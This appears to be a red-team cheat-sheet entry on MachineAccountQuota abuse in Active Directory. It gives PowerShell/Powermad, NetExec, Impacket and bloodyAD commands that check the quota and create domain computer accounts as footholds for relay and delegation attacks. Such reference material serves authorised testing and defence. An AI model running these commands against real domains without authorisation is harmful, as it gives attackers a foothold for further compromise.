---
technique: MachineAccountQuota Abuse
category: builtins
targets: Active Directory Domain
protocols: LDAP, SAMR
remote_capable: true
tags: builtins maq machine-account ldap samr kerberos rbcd foothold
---

# MachineAccountQuota Abuse

The `ms-DS-MachineAccountQuota` domain attribute (default: 10) allows any authenticated domain user to create up to that many computer accounts. These accounts serve as a foothold for further attacks including NTLM relay, Kerberos RBCD, and unconstrained delegation abuse.

## Windows

PowerShell RSAT and Powermad provide MAQ enumeration and machine account creation without requiring local admin.

### Get-ADObject (check MAQ)

#powershell #rsat #recon

Check the MachineAccountQuota value on the domain object to confirm unprivileged machine account creation is allowed.

```powershell title:"Check MachineAccountQuota with RSAT AD module"
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```
<!-- cheat -->

### Step 1: Prepare password for new machine account (Powermad)

#powershell #create

Convert the desired computer account password to a SecureString before creating the machine account.

```powershell title:"Convert machine account password to SecureString for Powermad"
$password = ConvertTo-SecureString "$computer_pass" -AsPlainText -Force
```
<!-- cheat
var computer_pass
-->

### Step 2: Create machine account (Powermad)

#powershell #create

Create a new domain computer account using the current user's credentials via Powermad.

```powershell title:"Create machine account with Powermad"
New-MachineAccount -MachineAccount "$computer_name" -Password $($password) -Verbose
```
<!-- cheat
var computer_name
-->

## Linux

NetExec, addcomputer.py, bloodyAD, and ldeep all support MAQ enumeration and computer account creation over LDAP or SAMR.

### nxc (check MAQ)

#python #recon #nxc

Check the MachineAccountQuota value via the NetExec MAQ module.

```sh title:"Check MachineAccountQuota with NetExec MAQ module"
nxc ldap "$rhost_ip" -d "$domain" -u "$user" -p "$pass" -M maq
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
-->

### addcomputer

#python #create #impacket

Create a new domain computer account using addcomputer.py from Impacket.

```sh title:"Create machine account with Impacket addcomputer"
addcomputer.py -computer-name "$computer_name$" -computer-pass "$computer_pass" -dc-host "$rhost_ip" -domain-netbios "$domain" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var computer_name
var computer_pass
-->

### bloodyAD (check MAQ)

#python #recon #ldap

Read the MachineAccountQuota attribute from the domain root object using bloodyAD.

```sh title:"Check MachineAccountQuota with bloodyAD"
bloodyad -d "$domain" -u "$user" -p "$pass" --host "$rhost_ip" get object "DC=$domain_component,DC=local" --attr ms-DS-MachineAccountQuota
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var domain_component
-->

### bloodyAD (create computer)

#python #create #ldap

Create a new domain computer account using bloodyAD.

```sh title:"Create machine account with bloodyAD"
bloodyad -d "$domain" -u "$user" -p "$pass" --host "$rhost_ip" add computer "$computer_name$" "$computer_pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_ip
var computer_name
var computer_pass
-->
